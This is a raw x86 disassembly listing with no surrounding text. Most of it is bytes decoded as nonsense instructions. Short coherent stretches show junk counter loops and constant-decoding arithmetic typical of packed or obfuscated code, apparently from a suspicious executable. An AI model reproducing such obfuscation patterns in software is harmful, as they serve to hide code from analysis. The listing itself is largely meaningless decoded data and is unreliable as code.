  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	(bad)
  40527f:	jb     0x405247
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x405213
  405289:	fisubr DWORD PTR ds:[eax]
  40528c:	mov    dl,0xfd
  40528e:	dec    ebx
  40528f:	jmp    0x4052d0
  405291:	cdq    
  405292:	push   ebp
  405293:	adc    al,0xe9
  405295:	int    0x32
  405297:	or     BYTE PTR [edx-0x76074b5f],cl
  40529d:	scas   eax,DWORD PTR es:[edi]
  40529e:	stos   DWORD PTR es:[edi],eax
  40529f:	in     eax,dx
  4052a0:	inc    edx
  4052a1:	test   BYTE PTR [ebx],al
  4052a3:	push   ebx
  4052a4:	jg     0x405226
  4052a6:	xor    al,0x59
  4052a8:	add    al,dl
  4052aa:	scas   al,BYTE PTR es:[edi]
  4052ab:	jae    0x405304
  4052ad:	and    eax,0x5b838ba2
  4052b2:	cmp    DWORD PTR [ebx],0x57
  4052b5:	outs   dx,BYTE PTR ds:[esi]
  4052b6:	add    BYTE PTR [ecx+ecx*1-0xa],al
  4052ba:	icebp  
  4052bb:	dec    edx
  4052bc:	jmp    0xbc1c:0xf1bdc522
  4052c3:	and    BYTE PTR [edx+0x7fb9bac0],dl
  4052c9:	test   BYTE PTR [ebp*1+0x4ec12bc0],bl
  4052d0:	mov    cl,al
  4052d2:	and    ebx,ebx
  4052d4:	jecxz  0x405287
  4052d6:	adc    edi,DWORD PTR [edi]
  4052d8:	jmp    0x4052df
  4052da:	pusha  
  4052db:	out    0xfe,al
  4052dd:	in     eax,dx
  4052de:	jbe    0x4052d7
  4052e0:	dec    edi
  4052e1:	dec    edx
  4052e2:	test   al,0xb1
  4052e4:	cmp    edi,DWORD PTR fs:[edx+0x68a26964]
  4052eb:	call   0x307859ac
  4052f0:	or     BYTE PTR [ebp+0x777d07c9],0xf1
  4052f7:	push   eax
  4052f8:	sbb    al,0x48
  4052fa:	inc    eax
  4052fb:	mov    eax,0x56a7fbb8
  405300:	xor    edi,DWORD PTR [esi+ecx*4]
  405303:	fidiv  DWORD PTR [eax+ecx*8-0x465661e0]
  40530a:	pop    edx
  40530b:	add    al,BYTE PTR [si]
  40530e:	stos   DWORD PTR es:[edi],eax
  40530f:	test   BYTE PTR [ebx-0x52],al
  405312:	pop    ds
  405313:	mov    esi,0x8b144532
  405318:	push   ebp
  405319:	lds    edi,FWORD PTR [ebx]
  40531b:	scas   al,BYTE PTR es:[edi]
  40531c:	das    
  40531d:	xchg   dl,bh
  40531f:	sbb    cl,BYTE PTR [eax+0x6f6c86cb]
  405325:	xchg   edi,esi
  405327:	in     eax,0xbf
  405329:	jbe    0x4053a7
  40532b:	xor    bh,cl
  40532d:	mov    dh,0x77
  40532f:	repnz push edx
  405331:	pop    ecx
  405332:	jge    0x405361
  405334:	leave  
  405335:	fldln2 
  405337:	bound  esp,QWORD PTR [edi-0x326d693d]
  40533d:	jge    0x405346
  40533f:	int    0x2a
  405341:	dec    BYTE PTR [edi+0xce7e3cc]
  405347:	xor    ecx,DWORD PTR [ebx+0x533afad3]
  40534d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40534e:	jg     0x405383
  405350:	ret    0xa7fc
  405353:	fldcw  WORD PTR [edi+0x38dc385f]
  405359:	mov    bh,bh
  40535b:	fwait
  40535c:	mov    fs,esp
  40535e:	xor    DWORD PTR [esi-0x17],ebp
  405361:	fist   WORD PTR [edx]
  405363:	test   DWORD PTR ds:0xd2ad28fa,ecx
  405369:	fs out 0xca,al
  40536c:	adc    DWORD PTR [ebx-0x62],esp
  40536f:	adc    dh,cl
  405371:	int3   
  405372:	or     eax,0x1e347216
  405377:	enter  0x6da5,0x94
  40537b:	icebp  
  40537c:	retf   0xcd41
  40537f:	or     al,0x55
  405381:	jo     0x40533b
  405383:	or     ebp,ebp
  405385:	xor    eax,0xfe54423c
  40538a:	mov    eax,0x7f216d64
  40538f:	push   edi
  405390:	xchg   edi,eax
  405391:	sbb    ch,BYTE PTR [eax+0x35]
  405394:	das    
  405395:	fidiv  WORD PTR [ebx+ecx*2+0x686a2487]
  40539c:	(bad)  
  40539d:	jg     0x405404
  40539f:	hlt    
  4053a0:	js     0x405374
  4053a2:	or     BYTE PTR [ebx-0x48],dl
  4053a5:	mov    gs,WORD PTR [eax-0x769d05f9]
  4053ab:	fwait
  4053ac:	mov    ds,WORD PTR [esi+edx*1]
  4053af:	packuswb mm3,QWORD PTR [eax]
  4053b2:	test   al,0xd0
  4053b4:	call   0x5d2b:0x76ddbfbe
  4053bb:	cli    
  4053bc:	jb     0x4053ec
  4053be:	pop    ds
  4053bf:	xchg   esp,eax
  4053c0:	shl    cl,1
  4053c2:	adc    ch,0x68
  4053c5:	xor    DWORD PTR [edi+0x4c],esi
  4053c8:	dec    ebp
  4053c9:	sub    ebx,DWORD PTR ds:0x2c57c90d
  4053cf:	xchg   edi,eax
  4053d0:	push   ss
  4053d1:	sar    edi,1
  4053d3:	pop    esp
  4053d4:	push   0x72
  4053d6:	mov    esp,0xdedebeb
  4053db:	pop    ds
  4053dc:	sub    ebp,DWORD PTR [ebx-0x402edba4]
  4053e2:	dec    esi
  4053e3:	push   ebp
  4053e4:	es jb  0x40545a
  4053e7:	jg     0x405443
  4053e9:	ror    DWORD PTR [ecx+0x57],0x25
  4053ed:	test   eax,0xb53046ef
  4053f2:	mov    bl,0x6e
  4053f4:	lahf   
  4053f5:	inc    ebx
  4053f6:	test   DWORD PTR [ebx+0x25fbcdd7],edi
  4053fc:	loop   0x40538f
  4053fe:	or     al,cl
  405400:	add    ah,0xd3
  405403:	stos   DWORD PTR es:[edi],eax
  405404:	cmp    DWORD PTR [edx+0x64f89b07],ebx
  40540a:	ins    DWORD PTR es:[edi],dx
  40540b:	lods   al,BYTE PTR ds:[esi]
  40540c:	mov    eax,ds:0x8950011
  405411:	inc    esi
  405412:	or     DWORD PTR [ebx+0x3eaa61dc],eax
  405418:	mov    eax,edx
  40541a:	lods   eax,DWORD PTR ds:[esi]
  40541b:	aaa    
  40541c:	shr    BYTE PTR ds:0xefcf2e0,1
  405422:	mov    eax,ds:0x9e93c87c
  405427:	hlt    
  405428:	jo     0x40548d
  40542a:	push   ds
  40542b:	xchg   DWORD PTR [esi+0x70e0d643],esi
  405431:	cmp    BYTE PTR [edx-0x17909fde],ah
  405437:	push   esp
  405438:	jmp    0x2de9:0xb9316aa5
  40543f:	xchg   ebx,eax
  405440:	or     dl,ch
  405442:	int    0xae
  405444:	xor    bh,BYTE PTR [edx+ebp*4+0x26]
  405448:	dec    ebx
  405449:	adc    eax,0xa10c0acf
  40544e:	sub    al,0x96
  405450:	sbb    dh,ah
  405452:	data16 sub al,0xed
  405456:	out    dx,al
  405457:	bound  edx,QWORD PTR [edi]
  405459:	mov    eax,ds:0x1e651b65
  40545e:	in     eax,dx
  40545f:	(bad)  
  405460:	aad    0x31
  405462:	sub    al,0x9a
  405464:	shl    BYTE PTR [ebx+0x755cc5ac],1
  40546a:	or     eax,0x4e617c85
  40546f:	es in  eax,dx
  405471:	pushf  
  405472:	dec    ecx
  405473:	cmp    BYTE PTR [ecx*2+0x42898dd5],bh
  40547a:	or     BYTE PTR [ebx+0x558b1c45],cl
  405480:	adc    BYTE PTR [ecx+0x458b0c42],cl
  405486:	and    BYTE PTR [ebx+0x42891055],cl
  40548c:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x43045f
  4054d4:	sbb    DWORD PTR ds:0x4303c5,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x4303f1,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x4303d5,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x430463,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x4303d5,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x4303d5
  40552a:	inc    eax
  40552b:	mov    ds:0x4303d5,eax
  405530:	cmp    DWORD PTR ds:0x4303d5,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x4303d5,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42eb97
  405555:	cmp    DWORD PTR ds:0x4303d5,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x4303d5
  405567:	inc    eax
  405568:	mov    ds:0x4303d5,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x4303f1,0x14
  40557c:	cmp    DWORD PTR ds:0x4303f1,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x4303f1,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42ea23
  4055a2:	cmp    DWORD PTR ds:0x4303f1,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x4303f1
  4055b7:	dec    eax
  4055b8:	mov    ds:0x4303f1,eax
  4055bd:	mov    eax,ds:0x4303f1
  4055c2:	dec    eax
  4055c3:	mov    ds:0x4303f1,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42ed53,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0xd2a2c60a
  4055e5:	inc    edx
  4055e6:	cdq    
  4055e7:	mov    esi,0x7e7e2a36
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x40562a
  4055f1:	cdq    
  4055f2:	ror    DWORD PTR [eax-0x71],cl
  4055f5:	push   ecx
  4055f6:	push   0x58
  4055f8:	mov    edx,0xd64b741e
  4055fd:	mov    dl,0x29
  4055ff:	xor    BYTE PTR [ebp+0x47],dl
  405602:	dec    ebp
  405603:	and    BYTE PTR [esi],cl
  405605:	scas   eax,DWORD PTR es:[edi]
  405606:	or     DWORD PTR [ecx-0x6c493e6a],esp
  40560c:	mov    dh,0xf3
  40560e:	in     eax,dx
  40560f:	scas   eax,DWORD PTR es:[edi]
  405610:	sub    eax,0xb975265a
  405615:	enter  0x1e53,0xc4
  405619:	sbb    DWORD PTR [esi+0x46],esi
  40561c:	test   BYTE PTR [esp+edx*1+0x35],bl
  405620:	aas    
  405621:	int    0x8a
  405623:	sbb    DWORD PTR [esi+ebp*8+0x6bf6a39a],ecx
  40562a:	pop    esi
  40562b:	loope  0x405617
  40562d:	or     DWORD PTR [edx],eax
  40562f:	xchg   esp,eax
  405630:	add    DWORD PTR ds:0x9cecc888,0xffffffdf
  405637:	mov    ds:0xca61db12,eax
  40563c:	xor    DWORD PTR [ebp-0x5b54e116],0x463ce0ab
  405646:	sbb    bh,BYTE PTR [eax-0x7d]
  405649:	push   ebp
  40564a:	push   ebp
  40564b:	or     edx,DWORD PTR [esi+0x65d93fed]
  405651:	arpl   WORD PTR [ecx+ebp*4+0x11],dx
  405655:	sub    DWORD PTR [ecx+edi*1],edi
  405658:	in     al,0xd3
  40565a:	repnz pop edx
  40565c:	mov    eax,0x74c71b6
  405661:	pop    ds
  405662:	std    
  405663:	pop    esp
  405664:	mov    tr2,edi
  405667:	xor    edi,eax
  405669:	push   es
  40566a:	xor    ecx,0xd51a0e91
  405670:	test   BYTE PTR [eax+0x11],ah
  405673:	add    BYTE PTR [edi+0xb],cl
  405676:	fs enterw 0x5581,0x57
  40567c:	shl    ch,0xd3
  40567f:	pop    es
  405680:	gs cli 
  405682:	dec    esi
  405683:	leave  
  405684:	mov    esi,0x12cba9e7
  405689:	es mov esi,0xd244444c
  40568f:	mov    DWORD PTR [edi],edx
  405691:	jb     0x4056da
  405693:	push   cs
  405694:	sub    esp,DWORD PTR [ebx]
  405696:	sub    BYTE PTR [esp+edi*2-0x51592506],ch
  40569d:	dec    edi
  40569e:	popf   
  40569f:	dec    eax
  4056a0:	jecxz  0x40566d
  4056a2:	shl    DWORD PTR [edx-0xc],cl
  4056a5:	aas    
  4056a6:	sbb    DWORD PTR [esi+ebx*4],0x801beafd
  4056ad:	jo     0x4056f6
  4056af:	dec    eax
  4056b0:	mov    es,ebp
  4056b2:	mov    cl,0x21
  4056b4:	not    BYTE PTR [edi]
  4056b6:	or     ch,BYTE PTR [ebx]
  4056b8:	es cdq 
  4056ba:	stos   DWORD PTR es:[edi],eax
  4056bb:	mov    eax,ds:0xf786214d
  4056c0:	jmp    DWORD PTR ds:0x99bf7eae
  4056c6:	test   eax,0xf3307c
  4056cb:	jecxz  0x4056c1
  4056cd:	in     al,0x5f
  4056cf:	scas   al,BYTE PTR es:[edi]
  4056d0:	rcr    ebp,cl
  4056d2:	adc    al,0x88
  4056d4:	adc    ch,BYTE PTR es:0xbd72132e
  4056db:	sbb    eax,edi
  4056dd:	lods   eax,DWORD PTR ds:[esi]
  4056de:	inc    ebp
  4056df:	add    esi,DWORD PTR [esi]
  4056e1:	test   eax,0xa5f96231
  4056e6:	repnz neg BYTE PTR [ebp+0x4cf0ed89]
  4056ed:	xor    ebx,esp
  4056ef:	jecxz  0x40570b
  4056f1:	in     eax,0xfa
  4056f3:	stc    
  4056f4:	test   eax,0xd5508d56
  4056f9:	hlt    
  4056fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056fb:	imul   edx,DWORD PTR [edi],0xffffff85
  4056fe:	xor    DWORD PTR [ebp-0x211681b5],ebp
  405704:	stc    
  405705:	fldcw  WORD PTR [eax-0x6b]
  405708:	outs   dx,DWORD PTR ds:[esi]
  405709:	mov    ds:0x7f61a231,eax
  40570e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40570f:	push   ds
  405710:	pop    eax
  405711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405712:	dec    esp
  405713:	ret    
  405714:	stc    
  405715:	sbb    ch,BYTE PTR [edx+0x15]
  405718:	dec    DWORD PTR [ebp-0x38]
  40571b:	in     al,0x61
  40571d:	or     al,0x8a
  40571f:	xchg   ebp,eax
  405720:	(bad)
  405725:	pushf  
  405726:	ins    DWORD PTR es:[edi],dx
  405727:	mov    cl,0x57
  405729:	ret    0xe4d1
  40572c:	pop    ds
  40572d:	sti    
  40572e:	bound  edx,QWORD PTR [ecx+0x62]
  405731:	inc    ecx
  405732:	push   ecx
  405733:	nop
  405734:	and    al,bh
  405736:	pop    ebp
  405737:	inc    eax
  405738:	clc    
  405739:	test   eax,0xb59ce2d1
  40573e:	mov    cl,0x5a
  405740:	dec    edx
  405741:	ins    DWORD PTR es:[edi],dx
  405742:	or     al,0x9b
  405744:	mov    bl,0xcb
  405746:	or     eax,0x1595ffc1
  40574b:	xchg   ebx,eax
  40574c:	sbb    BYTE PTR [eax],ch
  40574e:	or     eax,0x55164ec7
  405753:	pusha  
  405754:	std    
  405755:	push   esp
  405756:	icebp  
  405757:	or     al,0x5
  405759:	sub    ecx,ebx
  40575b:	mov    ebp,0xbc48ee1b
  405760:	mov    ds,WORD PTR [edx]
  405762:	push   edi
  405763:	jne    0x4057d8
  405765:	jo     0x405791
  405767:	dec    ecx
  405768:	push   edi
  405769:	mov    edi,0xfedef9f0
  40576e:	xor    BYTE PTR [ebp+0x42],dh
  405771:	shl    DWORD PTR [edi+esi*4],0xd
  405775:	and    BYTE PTR [edx],0x9a
  405778:	sub    BYTE PTR [edx+0x3beb4f50],dh
  40577e:	cs call 0xfd7b6095
  405784:	push   ss
  405785:	push   ebp
  405786:	xchg   DWORD PTR [ebx],ebp
  405788:	push   ds
  405789:	mov    al,0x6b
  40578b:	add    DWORD PTR [edx-0x3e55aba2],eax
  405791:	jb     0x40574b
  405793:	and    ah,al
  405795:	cmc    
  405796:	jb     0x405784
  405798:	xor    BYTE PTR [ebx+0x2d5ed56b],dh
  40579e:	mov    esi,0x22475575
  4057a3:	imul   esp,DWORD PTR [ebx+0x5f665ace],0xffffffd8
  4057aa:	mov    ebx,0xeaa69a48
  4057af:	idiv   esi
  4057b1:	jo     0x405784
  4057b3:	sbb    al,0x24
  4057b5:	scas   al,BYTE PTR es:[edi]
  4057b6:	(bad)  
  4057b9:	psrlw  mm7,QWORD PTR [ecx-0x2b]
  4057bd:	lea    esp,[esi]
  4057bf:	push   esi
  4057c0:	cdq    
  4057c1:	fs push eax
  4057c3:	retf   0x3927
  4057c6:	cdq    
  4057c7:	cmp    eax,0xc794e291
  4057cc:	inc    ebp
  4057cd:	int3   
  4057ce:	xor    DWORD PTR ds:0x5c7f89f,eax
  4057d4:	pop    ebx
  4057d5:	in     eax,dx
  4057d6:	inc    edx
  4057d7:	add    BYTE PTR [edx],bl
  4057d9:	add    BYTE PTR [eax],al
  4057db:	add    BYTE PTR [ebx+0x42ed5b3d],al
  4057e1:	add    BYTE PTR [eax],al
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42ed5b,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e957
  4057ff:	mov    eax,ds:0x42ed5b
  405804:	dec    eax
  405805:	mov    ds:0x42ed5b,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e748
  40581d:	or     DWORD PTR ds:0x4303c5,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x4303b9,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e754,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42ed6f
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42ed5b,0x1c
  405863:	cmp    DWORD PTR ds:0x42ed5b,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42ed5b,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e95b
  405886:	cmp    DWORD PTR ds:0x42ed5b,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42ed5b
  405898:	dec    eax
  405899:	mov    ds:0x42ed5b,eax
  40589e:	mov    eax,ds:0x42ed5b
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42ed5b,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x4303c1,0x42ed53
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x4303b5,0x42e744
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x430453,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x4303dd
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x4303bd
  4058ec:	xor    DWORD PTR ds:0x4303e1,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x4303d1,0x42ed6f
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x4303c1,0x42e748
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x4303c1
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42ed53,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42ed6b
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x4303e9,0x43046b
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x4303e9,0x42e748
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x430453
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x430453,0x42e754
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x4303bd,0x42ed5b
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42ed4f,0x42ed6b
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x4303d5
  405986:	sbb    eax,DWORD PTR ds:0x4303ed
  40598c:	mov    ds:0x4303d5,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	test   DWORD PTR [edi],ebx
  4059a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059a5:	das    
  4059a6:	or     eax,0x557e7e28
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x405960
  4059af:	(bad)  [eax+0x72f46246]
  4059b5:	loope  0x405938
  4059b7:	popa   
  4059b8:	mov    ecx,esi
  4059ba:	test   BYTE PTR [ecx+ebx*1+0x77268a2c],dl
  4059c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059c2:	es mov eax,0xc1161479
  4059c8:	ffreep st(1)
  4059ca:	aad    0xc3
  4059cc:	call   0xffd866e9
  4059d1:	ins    DWORD PTR es:[edi],dx
  4059d2:	xchg   BYTE PTR [esp+eax*1],al
  4059d5:	int3   
  4059d6:	and    esp,DWORD PTR [ebp+eax*8-0x41]
  4059da:	ficom  WORD PTR [ebp+eiz*4-0x455f20c7]
  4059e1:	clc    
  4059e2:	mov    eax,esi
  4059e4:	cli    
  4059e5:	cmp    eax,0x28775afe
  4059ea:	push   esp
  4059eb:	jno    0x4059c1
  4059ed:	pusha  
  4059ee:	pop    es
  4059ef:	dec    esi
  4059f0:	and    edi,edi
  4059f2:	fdivrp st(7),st
  4059f4:	lea    esi,[esp+ebx*8-0x649c7e6d]
  4059fb:	mov    bl,0xe6
  4059fd:	add    ah,BYTE PTR [ebx+0x7ad8f417]
  405a03:	enter  0xd752,0x0
  405a07:	sub    BYTE PTR [esi-0x789cc504],cl
  405a0d:	sub    ebx,DWORD PTR [ebx-0xd]
  405a10:	jns    0x405a17
  405a12:	mov    esi,0xf24ba40e
  405a17:	or     bh,BYTE PTR [edi-0x43e69a89]
  405a1d:	sti    
  405a1e:	dec    edi
  405a1f:	jmp    0x57094162
  405a24:	jmp    0x9b3ee4e
  405a29:	add    al,0x5c
  405a2b:	into   
  405a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a2d:	sub    BYTE PTR [edi],dl
  405a2f:	adc    dh,BYTE PTR [ebx-0x2736df82]
  405a35:	pop    edi
  405a36:	adc    BYTE PTR [edx],al
  405a38:	jno    0x405a90
  405a3a:	in     al,0xc5
  405a3c:	jae    0x405a39
  405a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a3f:	mov    ds:0x4dcd270f,eax
  405a44:	xchg   esi,eax
  405a45:	(bad)  
  405a47:	ins    DWORD PTR es:[edi],dx
  405a48:	fcmovbe st,st(2)
  405a4a:	popf   
  405a4b:	inc    eax
  405a4c:	inc    esp
  405a4d:	cmp    ebx,esi
  405a4f:	and    BYTE PTR [ecx],al
  405a51:	xchg   esp,eax
  405a52:	ret    
  405a53:	sahf   
  405a54:	add    al,0xc1
  405a56:	ins    DWORD PTR es:[edi],dx
  405a57:	imul   DWORD PTR [ebx-0x3a7dad1b]
  405a5d:	dec    ecx
  405a5e:	in     eax,0x13
  405a60:	or     DWORD PTR [esp+edx*2-0x1c25ebc3],edx
  405a67:	out    dx,al
  405a68:	sub    dh,BYTE PTR [ebp+0x51c4714a]
  405a6e:	nop
  405a6f:	outs   dx,DWORD PTR ds:[esi]
  405a70:	push   ebx
  405a71:	and    esi,ebp
  405a73:	out    dx,al
  405a74:	fnstsw WORD PTR [ebx+ecx*2+0x5008733f]
  405a7b:	out    dx,eax
  405a7c:	lea    ebp,ds:0x776dcc86
  405a82:	fisubr DWORD PTR [ebx]
  405a84:	or     DWORD PTR [eax],0x8a8ad95d
  405a8a:	push   ecx
  405a8b:	out    0x7f,al
  405a8d:	push   cs
  405a8e:	leave  
  405a8f:	lds    esp,FWORD PTR [edx+esi*4-0x6d]
  405a93:	test   esi,edi
  405a95:	mov    ch,0x95
  405a97:	mov    ebx,0x5944df8a
  405a9c:	mov    ebp,0x69d22317
  405aa1:	addr16 sbb eax,0x8525ee2f
  405aa7:	cmp    ch,BYTE PTR [esi]
  405aa9:	loop   0x405a30
  405aab:	pushf  
  405aac:	pop    esi
  405aad:	sbb    DWORD PTR [ebx+0x51efa8c4],0x8dee8a66
  405ab7:	adc    eax,0xd5abb405
  405abc:	push   ecx
  405abd:	push   eax
  405abe:	sbb    ecx,DWORD PTR [eax+0x5a]
  405ac1:	pop    es
  405ac2:	(bad)  
  405ac3:	sar    BYTE PTR ds:0x12601d93,0xc2
  405aca:	xor    ebx,DWORD PTR [edx]
  405acc:	mov    dl,0x53
  405ace:	cmp    ah,BYTE PTR [edx+0xc]
  405ad1:	or     al,0xb7
  405ad3:	push   cs
  405ad4:	out    dx,al
  405ad5:	jae    0x405a6d
  405ad7:	retf   0x3762
  405ada:	scas   eax,DWORD PTR es:[edi]
  405adb:	in     eax,0x1d
  405add:	pop    ss
  405ade:	sbb    dl,ch
  405ae0:	iret   
  405ae1:	mov    al,0x2c
  405ae3:	call   0xc8ba6608
  405ae8:	test   eax,0x960ef039
  405aed:	sub    cl,BYTE PTR [edi-0xe5d5f45]
  405af3:	test   edx,0xc2fc795
  405af9:	inc    edx
  405afa:	inc    eax
  405afb:	das    
  405afc:	js     0x405a9d
  405afe:	int3   
  405aff:	inc    eax
  405b00:	dec    ebp
  405b01:	retf   
  405b02:	mov    ecx,0xb79661fd
  405b07:	ficomp WORD PTR ds:0xea77788f
  405b0d:	adc    al,BYTE PTR [ebx+ebp*4-0x1309ec6f]
  405b14:	cmp    eax,0x4be162b9
  405b19:	mov    ecx,gs
  405b1b:	add    BYTE PTR [edx+0x69],0xd8
  405b1f:	int3   
  405b20:	inc    eax
  405b21:	inc    DWORD PTR [ecx+edi*4-0x209860fe]
  405b28:	out    0x8a,eax
  405b2a:	dec    ebp
  405b2b:	mov    esp,0x32ebe1
  405b30:	and    al,0xa1
  405b32:	addr16 xor eax,0x36a54386
  405b38:	enter  0x8cca,0xe9
  405b3c:	aaa    
  405b3d:	add    DWORD PTR ss:[esi+0x51],ecx
  405b41:	dec    eax
  405b42:	dec    eax
  405b43:	sub    ecx,0x49
  405b46:	sbb    BYTE PTR [ebx+0x69],0x93
  405b4a:	mov    dh,0x7b
  405b4c:	sysenter 
  405b4e:	sbb    ah,dl
  405b50:	mov    ecx,0xf5caf12c
  405b55:	pop    es
  405b56:	adc    BYTE PTR [eax*1-0x370fdbe9],al
  405b5d:	shl    BYTE PTR [ecx-0x3b],0xd0
  405b61:	stos   DWORD PTR es:[edi],eax
  405b62:	cmp    esp,DWORD PTR [ebx-0x5b]
  405b65:	int3   
  405b66:	pop    ebp
  405b67:	and    al,ah
  405b69:	cdq    
  405b6a:	cmp    DWORD PTR ds:0x440dd0bf,0x45
  405b71:	xor    eax,0x7ed9ffe1
  405b76:	dec    ebx
  405b77:	cmc    
  405b78:	aas    
  405b79:	(bad)  [eax+0x4d8b11b2]
  405b7f:	push   ss
  405b80:	push   esp
  405b81:	loope  0x405ba6
  405b83:	mov    esp,0xa8bfe4b6
  405b88:	xchg   ebx,eax
  405b89:	mov    eax,DWORD PTR [ebp-0x14]
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	jmp    0x405ba0
